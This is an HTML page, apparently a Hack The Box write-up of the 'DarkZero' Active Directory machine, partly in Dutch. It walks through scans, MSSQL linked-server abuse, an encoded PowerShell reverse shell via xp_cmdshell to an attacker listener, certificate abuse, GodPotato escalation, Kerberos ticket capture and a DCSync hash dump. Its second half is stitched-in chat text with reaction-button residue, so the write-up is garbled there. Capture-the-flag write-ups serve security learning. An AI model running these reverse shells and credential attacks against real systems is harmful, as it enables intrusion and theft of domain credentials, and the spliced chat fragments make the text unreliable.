@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Machine information As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Darkzero] └─$ nmap 10.129.98.254 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:01 CEST Nmap scan report for 10.129.98.254 Host is up (0.024s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2179/tcp open vmrdp 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-darkzero/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Machine information As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Darkzero] └─$ nmap 10.129.98.254 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:01 CEST Nmap scan report for 10.129.98.254 Host is up (0.024s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2179/tcp open vmrdp 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="1511">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Machine information As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Darkzero] └─$ nmap 10.129.98.254 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:01 CEST Nmap scan report for 10.129.98.254 Host is up (0.024s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2179/tcp open vmrdp 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-darkzero/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="machine-information">Machine information</h1>
+<p>As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!</p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Darkzero]
+└─$ nmap 10.129.98.254
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 20:01 CEST
+Nmap scan report for 10.129.98.254
+Host is up (0.024s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+2179/tcp open  vmrdp
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>nmap -sCV 10.129.98.254 
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 01:02:47Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+|_ssl-date: 2025-10-08T01:04:08+00:00; +6h59m59s from scanner time.
+| ms-sql-ntlm-info: 
+|   10.129.98.254:1433: 
+|     Target_Name: darkzero
+|     NetBIOS_Domain_Name: darkzero
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: darkzero.htb
+|     DNS_Computer_Name: DC01.darkzero.htb
+|     DNS_Tree_Name: darkzero.htb
+|_    Product_Version: 10.0.26100
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-10-08T01:02:11
+|_Not valid after:  2055-10-08T01:02:11
+| ms-sql-info: 
+|   10.129.98.254:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-10-08T01:03:28
+|_  start_date: N/A
+</code></pre><p>Aangezien dat we nu toch al de username en password van een user kennen zal ik de gegevens van de ldap server gaan halen zodat ik deze daarna kan gaan uploaden in bloodhound.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Darkzero]
+└─$ sudo nxc ldap 10.129.98.254 -u &#39;john.w&#39; -p &#39;RFulUtONCOL!&#39; --bloodhound --collection all --dns-server 10.129.98.254       
+LDAP        10.129.98.254   389    DC01             [*] 10.0 Build 26100 (name:DC01) (domain:darkzero.htb)
+LDAPS       10.129.98.254   636    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
+LDAPS       10.129.98.254   636    DC01             Resolved collection methods: psremote, acl, localadmin, rdp, dcom, container, objectprops, trusts, session, group                                                                   
+[03:46:18] ERROR    Unhandled exception in computer DC01.darkzero.htb processing: The NETBIOS       computers.py:268
+                    connection with the remote host timed out.                                                      
+LDAP        10.129.98.254   389    DC01             Done in 00M 27S
+LDAPS       10.129.98.254   636    DC01             Compressing output into /root/.nxc/logs/DC01_10.129.98.254_2025-10-08_034551_bloodhound.zip
+</code></pre><p>Zoals je ook hebt kunnen zien is de port van sql open. We gaan de connectie met de sql server proberen maken door gebruik te maken van mssqlclient commando.</p>
+<pre tabindex="0"><code>ssqlclient.py -windows-auth darkzero.htb/john.w:&#39;RFulUtONCOL!&#39;@10.129.98.254
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (darkzero\john.w  guest@master)&gt;
+</code></pre><p>Zoals je hierboven zult kunnen zien heb je nu de connectie. Ik zal gaan kijken welke tables er gekent zijn.</p>
+<pre tabindex="0"><code>SQL (darkzero\john.w  guest@master)&gt; SELECT name from master.dbo.sysdatabases
+name     
+------   
+master   
+
+tempdb   
+
+model    
+
+msdb
+</code></pre><p>Zoals je hieronder zult kunnen zien hebben we een link met de DC02 van de server.</p>
+<pre tabindex="0"><code>SQL (darkzero\john.w  guest@master)&gt; enum_links
+[%] EXEC sp_linkedservers
+SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
+DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
+
+DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
+
+[%] EXEC sp_helplinkedsrvlogin
+Linked Server       Local Login       Is Self Mapping   Remote Login   
+-----------------   ---------------   ---------------   ------------   
+DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
+</code></pre><p>Nu dat we dit weten zal ik de link gaan gebruiken voor connectie tussen de 2 te maken. Dit kan je gaan doen door het use_link commando te gaan gebruiken. Als er een linkname met punten in de naam is moet je de [] haakjes gebruiken voor de naam te laten herkenen.</p>
+<pre tabindex="0"><code>SQL (darkzero\john.w  guest@master)&gt; use_link [DC02.darkzero.ext]
+[%] EXEC (&#39;select system_user as &#34;username&#34;&#39;) AT [DC02.darkzero.ext]
+SQL &gt;[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)&gt;
+</code></pre><p>Daarna ben ik het xp_cmdshell gaan enable zodat ik mijn connectie tussen de server en de machine tot stand kon brengen. Door een listener op te zetten heb ik de connectie kunnen verkrijgen.</p>
+<pre tabindex="0"><code>mssqlclient
+
+SQL &gt;[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)&gt; enable_xp_cmdshell
+[%] EXEC (&#39;exec master.dbo.sp_configure &#39;&#39;show advanced options&#39;&#39;,1;RECONFIGURE;exec master.dbo.sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;RECONFIGURE;&#39;) AT [DC02.darkzero.ext]
+INFO(DC02): Line 196: Configuration option &#39;show advanced options&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC02): Line 196: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL &gt;[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)&gt; RECONFIGURE;
+[%] EXEC (&#39;RECONFIGURE;&#39;) AT [DC02.darkzero.ext]
+SQL &gt;[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+[%] EXEC (&#39;exec master..xp_cmdshell &#39;&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;&#39;&#39;) AT [DC02.darkzero.ext]
+
+Kali machine
+
+┌──(kali㉿kali)-[~/HTB/Darkzero]
+└─$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.129.12.43 53746
+
+PS C:\Windows\system32&gt;
+</code></pre><p>Als je een paar directories lowered kan je zien dat er een <code>Policy_Backup.inf</code> file is.</p>
+<pre tabindex="0"><code>PS C:\&gt; ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          5/8/2021   8:15 AM                PerfLogs                                                             
+d-r---         7/29/2025   2:49 PM                Program Files                                                        
+d-----         7/29/2025   2:48 PM                Program Files (x86)                                                  
+d-r---         7/29/2025   3:23 PM                Users                                                                
+d-----         7/30/2025  10:57 PM                Windows                                                              
+-a----         7/30/2025   1:38 PM          18594 Policy_Backup.inf 
+</code></pre><p>Als we deze nu eens gaan bekijken door het <code>type</code> commando te gaan gebruiken zal je het volgende zien.</p>
+<pre tabindex="0"><code>SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544
+[Version]
+signature=&#34;$CHICAGO$&#34;
+</code></pre><p>C:&gt; type Policy_Backup.inf
+&hellip;[snip]&hellip;</p>
+<p>SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
+SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
+:joy:
+Click to react
+:white_check_mark:
+Click to react
+:key:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+[4:57 PM]Tuesday, October 7, 2025 4:57 PM
+CERTIPY-&hellip; 172.16.20.2     389    DC02             Certificate Authorities
+CERTIPY-&hellip; 172.16.20.2     389    DC02               0
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 CA Name                             : darkzero-ext-DC02-CA
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 DNS Name                            : DC02.darkzero.ext
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 Certificate Subject                 : CN=darkzero-ext-DC02-CA, DC=darkzero, DC=ext
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 Certificate Serial Number           : 1643389103EC9DA6407DCE3E015ECD07
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 Certificate Validity Start          : 2025-07-29 14:17:46+00:00
+CERTIPY-&hellip; 172.16.20.2     389    DC02                 Certificate Validity End            : 2035-07-29 14:27:43+00:00
+[4:57 PM]Tuesday, October 7, 2025 4:57 PM
+ADCS,
+Note: Don&rsquo;t forget to pivot..</p>
+<p>To authenticate cert &amp; change password, you need to pivot</p>
+<h1 id="request-cert">Request Cert</h1>
+<p>PS &gt; .\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User</p>
+<h1 id="export-to-pfx">Export to pfx</h1>
+<p>➜ openssl pkcs12 -in cert.pem -keyex -CSP &ldquo;Microsoft Enhanced Cryptographic Provider v1.0&rdquo; -export -out cert.pfx</p>
+<h1 id="authenticate-cert">Authenticate Cert</h1>
+<p>➜ certipy auth -pfx cert.pfx -u svc_sql -domain darkzero.ext -dc-ip 172.16.20.2</p>
+<h1 id="changepassword">ChangePassword</h1>
+<p>➜ changepasswd.py <a href="mailto:svc_sql@darkzero.ext">svc_sql@darkzero.ext</a> -hashes :816ccb849956b531db139346751db65f <br>
+-newpass &lsquo;StrongPassword123&rsquo; -dc-ip 172.16.20.2
+(edited)Tuesday, October 7, 2025 5:13 PM
+:joy:
+Click to react
+:white_check_mark:
+Click to react
+:key:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+[4:57 PM]Tuesday, October 7, 2025 4:57 PM
+Shell as &lsquo;sql_svc&rsquo; | Elevated Shell,
+PS C:\programdata&gt; .\RunasCs.exe svc_sql &lsquo;StrongPassword123&rsquo; powershell -l 5 -b -r 10.10.X.X:9009</p>
+<p>➜ sudo rlwrap -cAr ncat -lnvp 9009
+&hellip;[snip]&hellip;</p>
+<p>PS C:\Windows\system32&gt; whoami; hostname
+darkzero-ext\svc_sql
+DC02</p>
+<p>PS C:\Windows\system32&gt; whoami /priv</p>
+<h2 id="privileges-information">PRIVILEGES INFORMATION</h2>
+<p>Privilege Name                Description                               State
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+[4:57 PM]Tuesday, October 7, 2025 4:57 PM
+SeImpersonate,
+Shell as Administrator | DC02,
+PS C:\programdata&gt; .\GodPotato.exe -cmd &rsquo;net user administrator StrongPassword456&rsquo;
+PS C:\programdata&gt; .\RunasCs.exe administrator &lsquo;StrongPassword456&rsquo; powershell -r 10.10.X.X:9008</p>
+<p>➜ sudo rlwrap -cAr ncat -lnvp 9008
+&hellip;[snip]&hellip;</p>
+<p>PS C:\Windows\system32&gt; whoami; hostname
+darkzero-ext\administrator
+DC02
+:joy:
+Click to react
+:white_check_mark:
+Click to react
+:key:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+[4:58 PM]Tuesday, October 7, 2025 4:58 PM
+Root,
+Shell as Administrator | DC01,</p>
+<h1 id="rubeus-monitor">Rubeus Monitor</h1>
+<p>PS &gt; .\Rubeus.exe monitor /interval:5 /nowrap</p>
+<h1 id="coerce-via-mssql-instance">Coerce via MSSQL instance</h1>
+<p>SQL &gt; xp_dirtree \DC02.darkzero.ext\pwn</p>
+<h1 id="get-dc01-ticket--decode--convert-it">Get DC01$ Ticket.. | Decode &amp; Convert it</h1>
+<p>➜ cat dc01.kirbi.b64 | base64 -d &gt; dc01.kirbi
+➜ ticketConverter.py dc01.kirbi dc01.ccache</p>
+<h1 id="verify-ticket">Verify Ticket</h1>
+<p>➜ klist dc01.ccache</p>
+<h1 id="dcsync--dump-hashes">DCSync | Dump Hashes</h1>
+<p>➜ secretsdump.py <a href="mailto:darkzero.htb/'dc01$'@dc01.darkzero.htb">darkzero.htb/'dc01$'@dc01.darkzero.htb</a> <br>
+-k -no-pass -dc-ip $ip</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
